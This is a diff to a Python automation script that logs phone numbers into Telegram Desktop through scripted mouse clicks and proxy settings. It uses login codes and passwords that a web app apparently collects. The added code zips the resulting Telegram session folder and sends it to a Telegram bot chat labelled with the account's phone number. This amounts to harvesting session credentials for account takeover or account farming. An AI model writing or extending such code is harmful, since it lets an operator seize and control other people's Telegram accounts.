@@ -11,6 +11,7 @@ import os
 import pywinctl as pwc
 import configparser
 import logging
+import zipfile
 import os.path
 import requests
 import traceback
@@ -116,17 +117,17 @@ def send_error_via_tg(traceback_filename, traceback_as_text=True):
 
 def login_telegram_client_part1(phone_number: str, proxy: dict[str, str], reset=False, restart=False,
                                 phone_number_debug="+7 (000) 123 12 12", sec_sleep=2, debug=False):
-    global accounts_on_client, target_telegram_path, config
+    global accounts_on_client, target_telegram_path
 
-    config.read("settings.ini")
-    accounts_on_client = int(config["GLOBAL"]["accounts_on_client"])
-    target_telegram_path = config["GLOBAL"]["target_telegram_path"]
+    #config.read("settings.ini")
+    #accounts_on_client = int(config["GLOBAL"]["accounts_on_client"])
+    #target_telegram_path = config["GLOBAL"]["target_telegram_path"]
 
     if debug:
         phone_number = phone_number_debug
 
     #accounts_on_client += 1
-    logger2.info(f"login_telegram_client accounts on client {accounts_on_client}")
+    #logger2.info(f"login_telegram_client accounts on client {accounts_on_client}")
     if restart:
         logger2.info("login_telegram_client ПЕРЕзапуск telegram PC")
         logger2.info("login_telegram_client закрытие существующих PC клиентов telegram")
@@ -135,65 +136,57 @@ def login_telegram_client_part1(phone_number: str, proxy: dict[str, str], reset=
                 proc.terminate()
         time.sleep(sec_sleep)
 
-    if (accounts_on_client >= 3 or target_telegram_path is None or
-            target_telegram_path.replace(" ", "") == "" or len(target_telegram_path) < 1) or reset:
-        formatted_datetime = datetime.datetime.now().strftime("%Y-%m-%d_%H.%M.%S")
-        logger2.info(f"login_telegram_client {formatted_datetime}")
-        if accounts_on_client >= 3 or reset:
-            accounts_on_client = 0
+    #if (accounts_on_client >= 3 or target_telegram_path is None or
+    #        target_telegram_path.replace(" ", "") == "" or len(target_telegram_path) < 1) or reset:
+    formatted_datetime = datetime.datetime.now().strftime("%Y-%m-%d_%H.%M.%S")
+    logger2.info(f"login_telegram_client {formatted_datetime}")
+    #if accounts_on_client >= 3 or reset:
+    #    accounts_on_client = 0
 
-        num_folder = 0
-        while num_folder < 10:
-            num_folder += 1
-            logger2.info("Попытка создать папку")
-            if not os.path.exists(f"telegram{formatted_datetime}_{num_folder}"):
-                os.makedirs(f'telegram{formatted_datetime}_{num_folder}')
-                # os.makedirs(f'telegram{formatted_datetime}_{num_folder}/TelegramForcePortable')
-                break
-            time.sleep(sec_sleep)
-        if num_folder >= 10:
-            logger2.critical("login_telegram_client ПАПКА НЕ СОЗДАНА")
-            send_error_via_tg("login_telegram_client ПАПКА НЕ СОЗДАНА")
-            return False
-        target_telegram_path = os.path.join(f'telegram{formatted_datetime}_{num_folder}', 'Telegram.exe')
-        logger2.info(f"login_telegram_client {target_telegram_path}")
+    num_folder = 0
+    while num_folder < 10:
+        num_folder += 1
+        logger2.info("Попытка создать папку")
+        if not os.path.exists(f"telegram{formatted_datetime}_{num_folder}"):
+            os.makedirs(f'telegram{formatted_datetime}_{num_folder}')
+            # os.makedirs(f'telegram{formatted_datetime}_{num_folder}/TelegramForcePortable')
+            break
         time.sleep(sec_sleep)
-        logger2.info(f"login_telegram_client копирование exe")
-        try:
-            shutil.copy(
-                os.path.join('Telegram.exe'),
-                target_telegram_path
-            )
-        except Exception as err:
-            logger2.exception(f"login_telegram_client FATAL copy {os.path.join('Telegram.exe')} "
-                              f"{target_telegram_path} : %s", err, exc_info=True)
+    if num_folder >= 10:
+        logger2.critical("login_telegram_client ПАПКА НЕ СОЗДАНА")
+        send_error_via_tg("login_telegram_client ПАПКА НЕ СОЗДАНА")
+        return False
+    target_telegram_path = os.path.join(f'telegram{formatted_datetime}_{num_folder}', 'Telegram.exe')
+    logger2.info(f"login_telegram_client {target_telegram_path}")
+    time.sleep(sec_sleep)
+    logger2.info(f"login_telegram_client копирование exe")
+    try:
+        shutil.copy(
+            os.path.join('Telegram.exe'),
+            target_telegram_path
+        )
+    except Exception as err:
+        logger2.exception(f"login_telegram_client FATAL copy {os.path.join('Telegram.exe')} "
+                          f"{target_telegram_path} : %s", err, exc_info=True)
 
-            send_error_via_tg(f"login_telegram_client FATAL copy {os.path.join('Telegram.b')}\n"
-                              f"{target_telegram_path}")
+        send_error_via_tg(f"login_telegram_client FATAL copy {os.path.join('Telegram.b')}\n"
+                          f"{target_telegram_path}")
 
-            exit(f"login_telegram_client FATAL copy {os.path.join('Telegram.exe')} {target_telegram_path}")
-        time.sleep(sec_sleep)
-        logger2.info("login_telegram_client закрытие существующих PC клиентов telegram")
-        for proc in psutil.process_iter():
-            if proc.name() == 'Telegram.exe':
-                proc.terminate()
-        time.sleep(sec_sleep)
-        logger2.info(f"login_telegram_client запуск telegram PC {target_telegram_path}")
-        try:
-            config.read("settings.ini")
-            config["GLOBAL"]["target_telegram_path"] = target_telegram_path
-            config["GLOBAL"]["accounts_on_client"] = str(accounts_on_client)
-            with open('settings.ini', 'w') as configfile:
-                config.write(configfile)
-        except Exception as e:
-            logger2.error("НЕ УДАЛОСЬ СОХРАНИТЬ target_telegram_path accounts_on_client")
-            logger2.critical(e)
+        exit(f"login_telegram_client FATAL copy {os.path.join('Telegram.exe')} {target_telegram_path}")
+    time.sleep(sec_sleep)
+    logger2.info("login_telegram_client закрытие существующих PC клиентов telegram")
+    for proc in psutil.process_iter():
+        if proc.name() == 'Telegram.exe':
+            proc.terminate()
+    time.sleep(sec_sleep)
+    logger2.info(f"login_telegram_client запуск telegram PC {target_telegram_path}")
 
-        #os.startfile(os.path.dirname(os.path.realpath(__file__)) + "\\" + target_telegram_path)
-        logger2.info(os.path.dirname(os.path.realpath(__file__)) + "\\" + target_telegram_path)
-        os.startfile(os.path.dirname(os.path.realpath(__file__)) + "\\" + target_telegram_path)
-        logger2.info("Ожидание 6 сек")
-        time.sleep(6)
+
+    #os.startfile(os.path.dirname(os.path.realpath(__file__)) + "\\" + target_telegram_path)
+    logger2.info(os.path.dirname(os.path.realpath(__file__)) + "\\" + target_telegram_path)
+    os.startfile(os.path.dirname(os.path.realpath(__file__)) + "\\" + target_telegram_path)
+    logger2.info("Ожидание 6 сек")
+    time.sleep(6)
     if restart:
         logger2.info("login_telegram_client ПЕРЕЗАПУСК закрытие существующих PC клиентов telegram")
         for proc in psutil.process_iter():
@@ -234,12 +227,12 @@ def login_telegram_client_part1(phone_number: str, proxy: dict[str, str], reset=
         win[0].show()
         logger2.info("Ожидание 3 сек")
         time.sleep(3)
-        if accounts_on_client == 0:
-            logger2.info(f"click PC по русски")
-            pyautogui.click(400, 564, interval=1)  # по русски
-            time.sleep(sec_sleep)
-            logger2.info(f"click PC начать общение")
-            pyautogui.click(400, 517, interval=1)  # начать общение
+        #if accounts_on_client == 0:
+        logger2.info(f"click PC по русски")
+        pyautogui.click(400, 564, interval=1)  # по русски
+        time.sleep(sec_sleep)
+        logger2.info(f"click PC начать общение")
+        pyautogui.click(400, 517, interval=1)  # начать общение
         time.sleep(sec_sleep)
         logger2.info(f"click PC по номеру")
         pyautogui.click(400, 569, interval=1)  # по номеру
@@ -249,65 +242,65 @@ def login_telegram_client_part1(phone_number: str, proxy: dict[str, str], reset=
         logger2.info(f"PC ввод номер нелефона без +7, после по номеру")
         pyautogui.typewrite(clear_phone_number, 0.3)  # номер нелефона без +7
         time.sleep(sec_sleep)
-        if accounts_on_client < 1:
-            logger2.info("Ставим прокси")
-            logger2.info("Настройки")
-            pyautogui.click(739, 51, interval=1)
-            time.sleep(sec_sleep // 2)
-            logger2.info(f"click PC тип соединения")
-            pyautogui.click(305, 178, interval=1)  # тип соед
-            time.sleep(sec_sleep // 2)
-            logger2.info(f"click PC использовать собственный прокси")
-            pyautogui.click(300, 329, interval=1)  # исп собствен прокси
-            time.sleep(sec_sleep // 2)
-            logger2.info(f"click PC HTTP")
-            pyautogui.click(290, 279, interval=1)  # HTTP
-            time.sleep(sec_sleep // 2)
-            logger2.info(f"Ввод PC ip прокси")
-            pyautogui.typewrite(proxy["ip"], 0.3)  # ip прокси
-            time.sleep(sec_sleep // 2)
-            pyautogui.typewrite(["tab"])
-            logger2.info(f"Ввод PC порт прокси через tab")
-            pyautogui.typewrite(proxy["port"], 0.3)  # порт прокси
-            time.sleep(sec_sleep // 2)
-            pyautogui.typewrite(["tab"])
-            logger2.info(f"Ввод PC логин прокси через tab")
-            pyautogui.typewrite(proxy["login"], 0.3)  # логин прокси
-            time.sleep(sec_sleep // 2)
-            pyautogui.typewrite(["tab"])
-            logger2.info(f"Ввод PC пароль прокси через tab")
-            pyautogui.typewrite(proxy["password"], 0.3)  # пароль прокси
-            time.sleep(sec_sleep // 2)
-            logger2.info(f"click PC сохранить прокси")
-            pyautogui.click(495, 598, interval=1)  # сохранить прокси
-            time.sleep(sec_sleep)
-            logger2.info(f"click PC закрыть прокси")
-            pyautogui.click(368, 616, interval=1)  # закрыть прокси
-            time.sleep(sec_sleep)
-            logger2.info(f"click PC закрыть продвинутые настройки")
-            pyautogui.click(570, 85, interval=1)  # закрыть настройки
-            time.sleep(sec_sleep)
+        #if accounts_on_client < 1:
+        logger2.info("Ставим прокси")
+        logger2.info("Настройки")
+        pyautogui.click(739, 51, interval=1)
+        time.sleep(sec_sleep // 2)
+        logger2.info(f"click PC тип соединения")
+        pyautogui.click(305, 178, interval=1)  # тип соед
+        time.sleep(sec_sleep // 2)
+        logger2.info(f"click PC использовать собственный прокси")
+        pyautogui.click(300, 329, interval=1)  # исп собствен прокси
+        time.sleep(sec_sleep // 2)
+        logger2.info(f"click PC HTTP")
+        pyautogui.click(290, 279, interval=1)  # HTTP
+        time.sleep(sec_sleep // 2)
+        logger2.info(f"Ввод PC ip прокси")
+        pyautogui.typewrite(proxy["ip"], 0.3)  # ip прокси
+        time.sleep(sec_sleep // 2)
+        pyautogui.typewrite(["tab"])
+        logger2.info(f"Ввод PC порт прокси через tab")
+        pyautogui.typewrite(proxy["port"], 0.3)  # порт прокси
+        time.sleep(sec_sleep // 2)
+        pyautogui.typewrite(["tab"])
+        logger2.info(f"Ввод PC логин прокси через tab")
+        pyautogui.typewrite(proxy["login"], 0.3)  # логин прокси
+        time.sleep(sec_sleep // 2)
+        pyautogui.typewrite(["tab"])
+        logger2.info(f"Ввод PC пароль прокси через tab")
+        pyautogui.typewrite(proxy["password"], 0.3)  # пароль прокси
+        time.sleep(sec_sleep // 2)
+        logger2.info(f"click PC сохранить прокси")
+        pyautogui.click(495, 598, interval=1)  # сохранить прокси
+        time.sleep(sec_sleep)
+        logger2.info(f"click PC закрыть прокси")
+        pyautogui.click(368, 616, interval=1)  # закрыть прокси
+        time.sleep(sec_sleep)
+        logger2.info(f"click PC закрыть продвинутые настройки")
+        pyautogui.click(570, 85, interval=1)  # закрыть настройки
+        time.sleep(sec_sleep)
         logger2.info(f"click PC продолжить")
         pyautogui.click(400, 486, interval=1)  # продолжить
         time.sleep(sec_sleep)
     else:
         logger2.critical(f"login_telegram_client не найдено окно telegram {win}")
-        try:
-            config.read("settings.ini")
-            config["GLOBAL"]["target_telegram_path"] = ""
-            config["GLOBAL"]["accounts_on_client"] = "0"
-            with open('settings.ini', 'w') as configfile:
-                config.write(configfile)
-        except Exception as e:
-            logger2.error(f"НЕ УДАЛОСЬ СОХРАНИТЬ {target_telegram_path} {accounts_on_client}")
-            logger2.critical(e)
+        #try:
+        #    config.read("settings.ini")
+        #    config["GLOBAL"]["target_telegram_path"] = ""
+        #    config["GLOBAL"]["accounts_on_client"] = "0"
+        #    with open('settings.ini', 'w') as configfile:
+        #        config.write(configfile)
+        #except Exception as e:
+        #    logger2.error(f"НЕ УДАЛОСЬ СОХРАНИТЬ {target_telegram_path} {accounts_on_client}")
+        #    logger2.critical(e)
         send_error_via_tg(f"login_telegram_client не найдено окно telegram \n{win}")
         return False
         # exit(f"login_telegram_client не найдено окно telegram {win}")
     return True
 
 
-def login_telegram_client_part2(code_tg: str, sec_sleep: int, password: str, debug=False,
+def login_telegram_client_part2(code_tg: str, sec_sleep: int, password: str, phone_number: str, debug=False,
                                 code_tg_debug=00000):
     global accounts_on_client, target_telegram_path
 
@@ -333,44 +326,104 @@ def login_telegram_client_part2(code_tg: str, sec_sleep: int, password: str, deb
     logger2.info(f"click PC три полоски")
     pyautogui.click(30, 55, interval=1)  # три полоски
     time.sleep(sec_sleep // 2)
-    logger2.info(f"click PC настройки")
-    try:
-        start = pyautogui.locateCenterOnScreen('start.png')  # If the file is not a png file it will not work
-        logger2.info(start)
-        pyautogui.click(start)  # Moves the mouse to the coordinates of the image
-        logger2.info("найдена кнопка добавить аккаунт синяя")
-    except pyautogui.ImageNotFoundException:
-        try:
-            start = pyautogui.locateCenterOnScreen('start2.png')  # If the file is not a png file it will not work
-            logger2.info(start)
-            pyautogui.click(start)  # Moves the mouse to the coordinates of the image
-            time.sleep(sec_sleep)
-            logger2.info("найдена кнопка настройки картинка")
-            logger2.info(f"click PC три точки")
-            pyautogui.click(528, 85, interval=1)  # три точки
-            time.sleep(sec_sleep // 2)
-            logger2.info(f"click PC добавить аккаунт")
-            pyautogui.click(419, 116, interval=1)  # добавить аккаунт
-        except pyautogui.ImageNotFoundException:
-            logger2.info("нажато по кордам 105, 545")
-            pyautogui.click(105, 545, interval=1)  # настройки
-            time.sleep(sec_sleep)
-            logger2.info(f"click PC три точки")
-            pyautogui.click(528, 85, interval=1)  # три точки
-            time.sleep(sec_sleep // 2)
-            logger2.info(f"click PC добавить аккаунт")
-            pyautogui.click(419, 116, interval=1)  # добавить аккаунт
+    #logger2.info(f"click PC настройки")
+    #try:
+    #    start = pyautogui.locateCenterOnScreen('start.png')  # If the file is not a png file it will not work
+    #    logger2.info(start)
+    #    pyautogui.click(start)  # Moves the mouse to the coordinates of the image
+    #    logger2.info("найдена кнопка добавить аккаунт синяя")
+    #except pyautogui.ImageNotFoundException:
+    #    try:
+    #        start = pyautogui.locateCenterOnScreen('start2.png')  # If the file is not a png file it will not work
+    #        logger2.info(start)
+    #        pyautogui.click(start)  # Moves the mouse to the coordinates of the image
+    #        time.sleep(sec_sleep)
+    #        logger2.info("найдена кнопка настройки картинка")
+    #        logger2.info(f"click PC три точки")
+    #        pyautogui.click(528, 85, interval=1)  # три точки
+    #        time.sleep(sec_sleep // 2)
+    #        logger2.info(f"click PC добавить аккаунт")
+    #        pyautogui.click(419, 116, interval=1)  # добавить аккаунт
+    #    except pyautogui.ImageNotFoundException:
+    #        logger2.info("нажато по кордам 105, 545")
+    #        pyautogui.click(105, 545, interval=1)  # настройки
+    #        time.sleep(sec_sleep)
+    #        logger2.info(f"click PC три точки")
+    #        pyautogui.click(528, 85, interval=1)  # три точки
+    #        time.sleep(sec_sleep // 2)
+    #        logger2.info(f"click PC добавить аккаунт")
+    #        pyautogui.click(419, 116, interval=1)  # добавить аккаунт
     time.sleep(sec_sleep)
-    accounts_on_client += 1
-    try:
-        config.read("settings.ini")
-        config["GLOBAL"]["target_telegram_path"] = target_telegram_path
-        config["GLOBAL"]["accounts_on_client"] = str(accounts_on_client)
-        with open('settings.ini', 'w') as configfile:
-            config.write(configfile)
-    except Exception as e:
-        logger2.error("НЕ УДАЛОСЬ СОХРАНИТЬ target_telegram_path accounts_on_client")
-        logger2.critical(e)
+    #try:
+    #    config.read("settings.ini")
+    #    config["GLOBAL"]["target_telegram_path"] = target_telegram_path
+    #    config["GLOBAL"]["accounts_on_client"] = str(accounts_on_client)
+    #    with open('settings.ini', 'w') as configfile:
+    #        config.write(configfile)
+    #except Exception as e:
+    #    logger2.error("НЕ УДАЛОСЬ СОХРАНИТЬ target_telegram_path accounts_on_client")
+    #    logger2.critical(e)
+    logger2.info("login_telegram_client закрытие существующих PC клиентов telegram")
+    for proc in psutil.process_iter():
+        if proc.name() == 'Telegram.exe':
+            proc.terminate()
+
+    archive_name = "server_state.zip"
+    skipped_folders = []
+    base_dir = os.getcwd()
+
+    logger2.info(skipped_folders)
+    logger2.info(base_dir)
+
+    logger2.info("Создаём архив")
+
+    # Создаём архив
+    with zipfile.ZipFile(archive_name, "w", zipfile.ZIP_DEFLATED) as archive:
+        try:
+            folder_path = os.path.join(base_dir, target_telegram_path)
+            logger2.info(folder_path)
+            for root, _, files in os.walk(folder_path):
+                for file in files:
+                    logger2.info(file)
+                    if is_not_exe(file):  # Пропускаем .exe файлы
+                        logger2.info(f"True {file}")
+                        file_path = os.path.join(root, file)
+                        logger2.info(file_path)
+                        # Добавляем файл в архив с сохранением структуры
+                        archive.write(
+                            file_path,
+                            os.path.relpath(file_path, base_dir)
+                        )
+        except Exception as e:
+            logger2.info(f"Скип {file}")
+            logger2.exception(e, exc_info=True)
+            skipped_folders.append(target_telegram_path)
+
+    telegram_bot_token = os.getenv("telegram_bot_token")
+    chat_id = os.getenv("chat_id")
+
+    if os.path.exists(archive_name):
+        log_response = send_file_to_telegram(
+            telegram_bot_token,
+            chat_id,
+            archive_name,
+            f'Аккаунт {phone_number} готов'
+        )
+        logger2.info(log_response)
+        os.remove(archive_name)
+    else:
+        bot_url_text = 'https://api.telegram.org/bot' + telegram_bot_token + '/sendMessage'
+
+        payload = {
+            'chat_id': chat_id,
+            'text': f"Архив не найден: {skipped_folders}"
+        }
+        requests.post(bot_url_text, data=payload)
+
+
+def is_not_exe(file_name):
+    logger2.info(f"is_not_exe {not file_name.lower().endswith(".exe")}")
+    return not file_name.lower().endswith(".exe")
 
 
 def create_app():
@@ -456,7 +509,7 @@ def create_app():
 
             time.sleep(1)
             login_telegram_client_part2(code_tg=auth_sessions[session_id]["auth_code"],
-                                        password=password, sec_sleep=1)
+                                        password=password, sec_sleep=1, phone_number=phone_number)
 
             # Запуск фонового потока для ожидания кода
 
@@ -495,10 +548,10 @@ def create_app():
     return app
 
 
-config = configparser.ConfigParser()
-config.read("settings.ini")
-accounts_on_client = int(config["GLOBAL"]["accounts_on_client"])
-target_telegram_path = config["GLOBAL"]["target_telegram_path"]
+#config = configparser.ConfigParser()
+#config.read("settings.ini")
+accounts_on_client = 0
+target_telegram_path = ""
 
 logger2 = logging.getLogger(__name__)
 logger2.setLevel(logging.DEBUG)
